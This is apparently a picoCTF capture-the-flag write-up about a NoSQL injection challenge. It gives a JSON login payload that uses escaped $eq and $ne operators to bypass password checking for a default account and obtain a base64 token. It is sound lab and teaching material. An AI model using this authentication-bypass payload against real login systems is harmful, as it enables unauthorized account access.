
## Enumeration
![[Pasted image 20250305153951.png]]

In the source code, we found a default email address called `picoplayer355@picoctf.org`

We also see that the content MUST have a curly bracket wrapped
![[Pasted image 20250305154041.png]]


Therefore, we learn that the payload would look something like this

```JSON
{"email":"{_}","password":"{_}"}
```

However, we have to escape the JSON. Otherwise, we will have syntax error.

```JSON
{"email":"{\"key\":\"value\"}","password":"{\"key\":\"value\"}"}
```

## Exploitation
The payload would be:

```JSON
{"email":"{\"$eq\":\"picoplayer355@picoctf.org\"}","password":"{\"$ne\":\"whatever\"}"}
```
This means we are telling the database to look up an email that is equal to... and not equal whatever the password is.

We are in, and the reponse has a base64 token
![[Pasted image 20250305154439.png]]

Decoding the base64
![[Pasted image 20250305154514.png]]
